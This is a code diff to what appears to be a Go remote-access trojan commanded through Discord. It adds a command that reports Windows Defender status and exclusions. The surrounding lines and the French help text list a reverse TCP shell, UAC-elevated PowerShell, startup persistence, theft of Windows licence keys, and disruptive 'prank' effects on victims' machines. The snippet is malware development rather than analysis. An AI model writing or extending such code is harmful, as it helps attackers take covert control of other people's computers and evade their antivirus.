@@ -586,6 +586,9 @@ func c2Execute(command string) {
 	case "persist":
 		discordReply(persistSet(strings.ToLower(strings.TrimSpace(args))))
 
+	case "defender", "av", "wd":
+		discordReply(defenderReport(args))
+
 	case "shell_tcp", "connect":
 		fields2 := strings.Fields(args)
 		if len(fields2) < 2 {
@@ -649,6 +652,7 @@ func c2Help() string {
 		"!licence             clés d'activation Windows\n" +
 		"!elevate <cmd>       PowerShell en admin (UAC)\n" +
 		"!persist on|off      démarrage avec Windows\n" +
+		"!defender            état Defender (exclude = exclusions)\n" +
 		"!prank <effet> [a]   msg, wall, url, speak, beep, cd,\n" +
 		"                     rotate, taskbar, volume, lock, swapmouse\n" +
 		"!shell_tcp <h> <p>   reverse shell TCP\n" +
